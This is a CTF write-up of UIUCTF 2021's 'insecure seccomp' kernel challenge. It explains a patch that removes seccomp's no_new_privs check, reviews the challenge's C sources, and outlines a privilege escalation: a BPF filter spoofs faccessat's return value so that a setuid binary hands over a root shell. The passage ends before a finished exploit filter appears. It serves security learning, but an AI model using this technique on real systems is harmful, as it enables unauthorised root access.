<h1 id="intro">Intro</h1>

<p>This writeup is pretty late, given that <a href="https://ctftime.org/event/1372">UIUCTC 21</a> ended a good few days ago, but now its here.</p>

<p>This was a first for me, and for my team-mate <a href="https://twitter.com/X3eRo0/">X3eRo0</a>; a kernel challenge in a live CTF environment. Although we both finished the kernel section of <a href="https://pwn.college/">pwn.college</a> this was a little different, as you’ll see.</p>

<h2 id="pre-requisites">Pre-requisites</h2>

<p>This writeup assumes that the reader knows what <code class="language-plaintext highlighter-rouge">seccomp</code> is, and what it does along with how it does it. If you don’t, reading through the <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man page</a> a little will help with that understanding.</p>

<h2 id="what">What</h2>

<p>The challenge gives us links to a <code class="language-plaintext highlighter-rouge">handout.tar.gz</code> and <code class="language-plaintext highlighter-rouge">starter.c</code>. On extracting the handout, we are greeted with a <code class="language-plaintext highlighter-rouge">challenge</code> folder, and inside that folder are the following files:</p>

<p>` Dockerfile  kernel/  nsjail.cfg  src/ `</p>

<p>We are given a <code class="language-plaintext highlighter-rouge">Dockerfile</code>, <code class="language-plaintext highlighter-rouge">kernel/</code> directory, an nsjail configuration file and a <code class="language-plaintext highlighter-rouge">src/</code> folder. Building this in docker takes a long time, and quite a lot of disk space so if you want to you can skip that process completely and just use:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> nc insecure-seccomp.chal.uiuc.tf 1337<span class="p">;</span> <span class="nb">stty</span> <span class="nt">-raw</span> <span class="nb">echo</span>
</code></pre></div></div>

<p>To connect to the remote service, IF its still up, that is. Anyway, looking in the dockerfile we can get some details about our challenge before even reading the source, in particular:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>COPY kernel/kconfig /kernel/linux-5.12.14/.config
COPY kernel/patch /tmp/kernel.patch
COPY kernel/CVE-2021-33909.patch /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 &lt; /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 &lt; /tmp/kernel.patch
</code></pre></div></div>

<p>Here we can see the some files, such as the <code class="language-plaintext highlighter-rouge">kconfig</code> which contains flags and build instructions for our kernel, and 2 other files, <code class="language-plaintext highlighter-rouge">patch</code> and <code class="language-plaintext highlighter-rouge">CVE-2021-33909.patch</code>. The latter provides a fix for a recent CVE, and is not relevant on our end, however the former is a bit more interesting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>diff --git a/init/main.c b/init/main.c                                                                                               
index 5bd1a25f1d6f..ee7dc4a65c08 100644
--- a/init/main.c
+++ b/init/main.c
@@ -1490,7 +1490,7 @@ void __init console_on_rootfs(void)
        struct file *file = filp_open("/dev/console", O_RDWR, 0);

        if (IS_ERR(file)) {
-               pr_err("Warning: unable to open an initial console.\n");
+               // pr_err("Warning: unable to open an initial console.\n");
                return;
        }
        init_dup(file);
diff --git a/kernel/seccomp.c b/kernel/seccomp.c
index 93684cc63285..e8574297803c 100644
--- a/kernel/seccomp.c
+++ b/kernel/seccomp.c
@@ -648,9 +648,9 @@ static struct seccomp_filter *seccomp_prepare_filter(struct sock_fprog *fprog)
         * This avoids scenarios where unprivileged tasks can affect the
         * behavior of privileged children.
         */
-       if (!task_no_new_privs(current) &amp;&amp;
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
-               return ERR_PTR(-EACCES);
+       // if (!task_no_new_privs(current) &amp;&amp;
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
+       //      return ERR_PTR(-EACCES);

        /* Allocate a new seccomp_filter */
        sfilter = kzalloc(sizeof(*sfilter), GFP_KERNEL | __GFP_NOWARN);
</code></pre></div></div>

<p>In particular, look closely at these lines:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* This avoids scenarios where unprivileged tasks can affect the
* behavior of privileged children.
*/
-       if (!task_no_new_privs(current) &amp;&amp;
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
-               return ERR_PTR(-EACCES);
+       // if (!task_no_new_privs(current) &amp;&amp;
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
+       //      return ERR_PTR(-EACCES);
</code></pre></div></div>

<p>It looks like before our kernel is compiled, the <code class="language-plaintext highlighter-rouge">patch</code> command is used comment some lines out, but what is the significance of these lines? Well, googling <code class="language-plaintext highlighter-rouge">test_no_new_privs()</code> the first result is <a href="http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html">this</a>, here we can see a function prototype and a description for what purpose this has:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">bool</span> <span class="n">task_no_new_privs</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p>The description states: <code class="language-plaintext highlighter-rouge">Determine whether a bit is set</code>. Of course this makes sense given the function returns a Boolean. Now lets look at the implementation. The latter also links to a source snipped, however our kernel version is different, so we can look <a href="https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646">here</a> instead:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Per-process atomic flags. */</span>
<span class="cp">#define PFA_NO_NEW_PRIVS		0	</span><span class="cm">/* May not gain new privileges. */</span><span class="cp">
#define PFA_SPREAD_PAGE			1	</span><span class="cm">/* Spread page cache over cpuset */</span><span class="cp">
#define PFA_SPREAD_SLAB			2	</span><span class="cm">/* Spread some slab caches over cpuset */</span><span class="cp">
#define PFA_SPEC_SSB_DISABLE		3	</span><span class="cm">/* Speculative Store Bypass disabled */</span><span class="cp">
#define PFA_SPEC_SSB_FORCE_DISABLE	4	</span><span class="cm">/* Speculative Store Bypass force disabled*/</span><span class="cp">
#define PFA_SPEC_IB_DISABLE		5	</span><span class="cm">/* Indirect branch speculation restricted */</span><span class="cp">
#define PFA_SPEC_IB_FORCE_DISABLE	6	</span><span class="cm">/* Indirect branch speculation permanently restricted */</span><span class="cp">
#define PFA_SPEC_SSB_NOEXEC		7	</span><span class="cm">/* Speculative Store Bypass clear on execve() */</span><span class="cp">
</span>
<span class="cp">#define TASK_PFA_TEST(name, func)					\
	static inline bool task_##func(struct task_struct *p)		\
	{ return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="cp">#define TASK_PFA_SET(name, func)					\
	static inline void task_set_##func(struct task_struct *p)	\
	{ set_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="cp">#define TASK_PFA_CLEAR(name, func)					\
	static inline void task_clear_##func(struct task_struct *p)	\
	{ clear_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span>
<span class="n">TASK_PFA_TEST</span><span class="p">(</span><span class="n">NO_NEW_PRIVS</span><span class="p">,</span> <span class="n">no_new_privs</span><span class="p">)</span>
</code></pre></div></div>

<p>Specifically, the definition is on the last line. Doesn’t much look like a function definition, does it? But it gets a bit clearer when you look at the macro being used:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TASK_PFA_TEST(name, func)                    \
    static inline bool task_##func(struct task_struct *p)        \
    { return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }
</span></code></pre></div></div>

<p>It takes a <code class="language-plaintext highlighter-rouge">name</code> and a <code class="language-plaintext highlighter-rouge">func</code>, then based on that will use even more macros to stitch together a function name, we pass in <code class="language-plaintext highlighter-rouge">NO_NEW_PRIVS</code> as our <code class="language-plaintext highlighter-rouge">name</code>, and <code class="language-plaintext highlighter-rouge">no_new_privs</code> as our <code class="language-plaintext highlighter-rouge">func</code>, and based on that it will give us a function name of <code class="language-plaintext highlighter-rouge">task_no_new_privs</code>.</p>

<p>If we look inside the function, we can see that it is, in fact testing a bit. In this case <code class="language-plaintext highlighter-rouge">PFA_NO_NEW_PRIVS</code>, or ‘1’. So what is the purpose of this bit, exactly?</p>

<p>Again, by googling we can find <a href="https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter">this</a> answer on stack overflow. The gist is:</p>

<p>“The no_new_privs bit is a property of the process which, if set, tells the kernel to not employ privileges escalation mechanisms like SUID bit (so, invoking things like sudo(8) will not work at all), so it is safe to allow the unprivileged process with this bit set to use seccomp filters: this process will not have any possibility to escalate privileges even temporarily, thus, will not be able to “hijack” these privileges.”</p>

<p><code class="language-plaintext highlighter-rouge">seccomp</code> has a lot of features, one of which is the ability to skip a syscall, and set an arbitrary <code class="language-plaintext highlighter-rouge">ERRNO</code>/return value from said syscall. Look at this code, taken from the answer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Make the `openat(2)` syscall always "succeed".</span>
<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">seccomp</span><span class="p">,</span> <span class="n">SCMP_ACT_ERRNO</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">openat</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>Once this rule is applied, the <code class="language-plaintext highlighter-rouge">openat</code> syscall will return ‘0’ regardless of whether the file in question actually exists. This means that checks in the program that expect a ‘-1’ on failure will be invalidated and depending on the depth of error checking may just assume the file exists, when it in fact does not.</p>

<p>Now with that knowledge we can look back on the patched code from our kernel:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">task_no_new_privs</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
<span class="o">-</span>                       <span class="o">!</span><span class="n">ns_capable_noaudit</span><span class="p">(</span><span class="n">current_user_ns</span><span class="p">(),</span> <span class="n">CAP_SYS_ADMIN</span><span class="p">))</span>
<span class="o">-</span>               <span class="k">return</span> <span class="nf">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EACCES</span><span class="p">);</span>
</code></pre></div></div>

<p>So, if the <code class="language-plaintext highlighter-rouge">no_new_privs</code> bit is NOT set (meaning the process to which the seccomp rule is being applied IS setuid/running under sudo) AND the current process was not started by root, <code class="language-plaintext highlighter-rouge">seccomp</code> will fail before loading the filter/rule, meaning that no meddling with the return value is possible where we may have something to gain from it.</p>

<p>But now remember the patch:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span>       <span class="c1">// if (!task_no_new_privs(current) &amp;&amp;</span>
<span class="o">+</span>       <span class="c1">//              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))</span>
<span class="o">+</span>       <span class="c1">//      return ERR_PTR(-EACCES);</span>
</code></pre></div></div>

<p>This has been undone. Any process, regardless of setuid status will have the rule applied. This will be incredibly important moving forward, so don’t forget :).</p>

<h2 id="the-challenge">The challenge</h2>

<p>Now that we have covered all that, we can get to the challenge sources. Lets first take a look at <code class="language-plaintext highlighter-rouge">jail.c</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: Apache-2.0                                                                                               </span>
<span class="cm">/*
 * Copyright 2021 Google LLC.
 */</span>

<span class="cp">#define _GNU_SOURCE
</span>
<span class="cp">#include &lt;grp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">setgid</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"setgid"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">setgroups</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"setgroups"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"setuid"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">putchar</span><span class="p">(</span><span class="sc">'\n'</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/resize &gt; /dev/null"</span><span class="p">);</span>
        <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="n">perror</span><span class="p">(</span><span class="s">"execl"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This isn’t particularly special, just know that this is the source for the shell you receive when you interact with the remote service.
Now lets look at <code class="language-plaintext highlighter-rouge">seccomp_loader.c</code>, an interesting name for sure given what we know about the kernel:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: Apache-2.0                                                                                               </span>
<span class="cm">/*
 * Copyright 2021 Google LLC.
 */</span>

<span class="cp">#include &lt;errno.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">perror_exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
<span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">seccomp</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
        <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_seccomp</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">num_insns</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sock_filter</span> <span class="o">*</span><span class="n">insns</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">prog</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage: %s [command]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%hu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num_insns</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
                <span class="k">goto</span> <span class="n">bad_format</span><span class="p">;</span>

        <span class="n">insns</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">num_insns</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">insns</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">insns</span><span class="p">)</span>
                <span class="n">perror_exit</span><span class="p">(</span><span class="s">"calloc"</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_insns</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">" %hx %hhx %hhx %x"</span><span class="p">,</span>
                          <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">code</span><span class="p">,</span>
                          <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jt</span><span class="p">,</span>
                          <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jf</span><span class="p">,</span>
                          <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">k</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span>
                        <span class="k">goto</span> <span class="n">bad_format</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">prog</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">num_insns</span><span class="p">;</span>
        <span class="n">prog</span><span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">insns</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">seccomp</span><span class="p">(</span><span class="n">SECCOMP_SET_MODE_FILTER</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">))</span>
                <span class="n">perror_exit</span><span class="p">(</span><span class="s">"seccomp"</span><span class="p">);</span>

        <span class="n">execv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">perror_exit</span><span class="p">(</span><span class="s">"execv"</span><span class="p">);</span>

<span class="nl">bad_format:</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Bad format</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Whats this then? One of the ways you can apply <code class="language-plaintext highlighter-rouge">seccomp</code> rules to a program is via BPF. BPF is a relatively old feature of the Linux kernel, and for our purposes provides a programmable way to filter syscalls. Its alot deeper than that; it has its own JIT compiler in the kernel, and is also used across many projects to provide monitoring and filtering capabilities, but we’ll be focusing specifically on syscall filtering.</p>

<p>Anyway, <code class="language-plaintext highlighter-rouge">seccomp</code> has <code class="language-plaintext highlighter-rouge">SECCOMP_SET_MODE_FILTER</code> which we can use to apply BPF rules the same way we would apply regular rules. Since BPF is JIT compiled in the kernel, it has its own bytecode architecture; each instruction of this arch comes packed into a struct:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sock_filter</span> <span class="p">{</span>    <span class="cm">/* Filter block */</span>
        <span class="n">__u16</span>   <span class="n">code</span><span class="p">;</span>   <span class="cm">/* Actual filter code */</span>
        <span class="n">__u8</span>    <span class="n">jt</span><span class="p">;</span>     <span class="cm">/* Jump true */</span>
        <span class="n">__u8</span>    <span class="n">jf</span><span class="p">;</span>     <span class="cm">/* Jump false */</span>
        <span class="n">__u32</span>   <span class="n">k</span><span class="p">;</span>      <span class="cm">/* Generic multiuse field */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>You only have to look deep into the abyss if you want to, but you don’t particularly need to if you don’t want to, I know I didn’t - but if you do, take a look at:</p>

<ul>
  <li>https://www.collabora.com/news-and-blog/blog/2019/04/15/an-BPF-overview-part-2-machine-and-bytecode/</li>
  <li>https://www.youtube.com/watch?v=2lbtr85Yrs4</li>
</ul>

<p>All you need to know is this is how each BPF instruction is formatted. There is another strange type here, <code class="language-plaintext highlighter-rouge">sock_fprog</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sock_fprog</span> <span class="p">{</span>	<span class="cm">/* Required for SO_ATTACH_FILTER. */</span>
	<span class="kt">unsigned</span> <span class="kt">short</span>		<span class="n">len</span><span class="p">;</span>	<span class="cm">/* Number of filter blocks */</span>
	<span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">__user</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This stores a list/array of <code class="language-plaintext highlighter-rouge">sock_filter</code>s, and as the name would suggest this structure is intended to store an entire BPF program, with many instructions.</p>

<p>Next some pretty nice stuff happens:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%hu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num_insns</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">bad_format</span><span class="p">;</span>

<span class="n">insns</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">num_insns</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">insns</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">insns</span><span class="p">)</span>
        <span class="n">perror_exit</span><span class="p">(</span><span class="s">"calloc"</span><span class="p">);</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_insns</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">" %hx %hhx %hhx %x"</span><span class="p">,</span>
                  <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">code</span><span class="p">,</span>
                  <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jt</span><span class="p">,</span>
                  <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jf</span><span class="p">,</span>
                  <span class="o">&amp;</span><span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">k</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span>
                <span class="k">goto</span> <span class="n">bad_format</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">prog</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">num_insns</span><span class="p">;</span>
<span class="n">prog</span><span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">insns</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">seccomp</span><span class="p">(</span><span class="n">SECCOMP_SET_MODE_FILTER</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">))</span>
        <span class="n">perror_exit</span><span class="p">(</span><span class="s">"seccomp"</span><span class="p">);</span>

<span class="n">execv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="n">perror_exit</span><span class="p">(</span><span class="s">"execv"</span><span class="p">);</span>
</code></pre></div></div>

<p>Via <code class="language-plaintext highlighter-rouge">scanf()</code>, were given control over the entire <code class="language-plaintext highlighter-rouge">sock_fprog</code> and each <code class="language-plaintext highlighter-rouge">sock_filter</code>, we can also apply as many instructions as we want, as we control the <code class="language-plaintext highlighter-rouge">len</code> field of the struct. Our filter is then applied, and then we <code class="language-plaintext highlighter-rouge">execv</code> with our <code class="language-plaintext highlighter-rouge">argv[1]</code>. What this means is:</p>

<ul>
  <li>We control the entire BPF program.</li>
  <li>As seccomp filters also apply to children, we may apply this filter to any program we want by adding the path to <code class="language-plaintext highlighter-rouge">argv[1]</code></li>
  <li>Because of the kernel patch, we can apply this even to setuid binaries.</li>
</ul>

<p>You would assume, correctly, that BPF has all the capabilities of a regular seccomp rule/set of rules.</p>

<p>Now, are there any setuid programs here?</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-r-sr-xr-x</span>    1 0        0            29008 Jul 30 22:20 exploit_me
</code></pre></div></div>

<p>Yes, yes there is. Shall we take a look next at <code class="language-plaintext highlighter-rouge">exploit_me.c</code>?</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: Apache-2.0                                                                                               </span>
<span class="cm">/*
 * Copyright 2021 Google LLC.
 */</span>

<span class="cp">#include &lt;assert.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">faccessat</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s">"/flag"</span><span class="p">,</span> <span class="n">R_OK</span><span class="p">,</span> <span class="n">AT_EACCESS</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"You can't be root to execute this! ... or can you?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">setuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">());</span>

        <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"execl"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Pretty simple. If <code class="language-plaintext highlighter-rouge">faccessat</code> would not access the file <code class="language-plaintext highlighter-rouge">/flag</code> (or, if it where to just return a non-zero value) we will get a root shell, and from there we will be able to <code class="language-plaintext highlighter-rouge">cat /flag</code>. However how would this work? <code class="language-plaintext highlighter-rouge">faccessat</code> <em>should</em> always find <code class="language-plaintext highlighter-rouge">/flag</code>, because it exists? Right?</p>

<h1 id="exploitation">Exploitation</h1>

<p>This is a little different from what I’m used to, its not really binary exploitation, but more of a logic bug. Although this isn’t necessarily a bad thing; much less can go wrong when exploiting bugs like this, in fact almost nothing.</p>

<p>Anyway, exploitation is pretty straightforward:</p>

<ol>
  <li>Make a BPF filter to ‘hook’ the <code class="language-plaintext highlighter-rouge">faccessat</code> syscall, and make it return a nonzero value.</li>
  <li>Run <code class="language-plaintext highlighter-rouge">exploit_me</code> under <code class="language-plaintext highlighter-rouge">seccomp_loader</code> with this filter</li>
  <li>Get root, cat flag.</li>
</ol>

<p>When downloading the program, we are given a <code class="language-plaintext highlighter-rouge">starter.c</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="cm">/*
 * Copyright 2021 Google LLC.
 */</span>

<span class="cp">#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">insns</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
		<span class="c1">// Your filter here</span>
		<span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
	<span class="p">};</span>
